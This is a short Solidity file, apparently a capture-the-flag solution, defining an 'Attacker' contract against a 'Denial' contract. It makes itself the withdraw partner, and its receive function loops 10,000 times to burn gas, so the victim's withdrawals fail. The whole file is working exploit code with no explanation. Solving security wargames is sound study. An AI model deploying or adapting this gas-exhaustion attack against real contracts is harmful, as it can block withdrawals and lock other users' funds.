pragma solidity ^0.8.0;

import "./Denial.sol";

contract Attacker {
    Denial denial;
    uint public count;
    
    constructor(address payable denialAddress) {
        denial = Denial(denialAddress);
    }

    function attack() public {
        denial.setWithdrawPartner(address(this));
    }

    receive() external payable {
        for(uint i = 0; i < 10000; i++) count++;
    }
}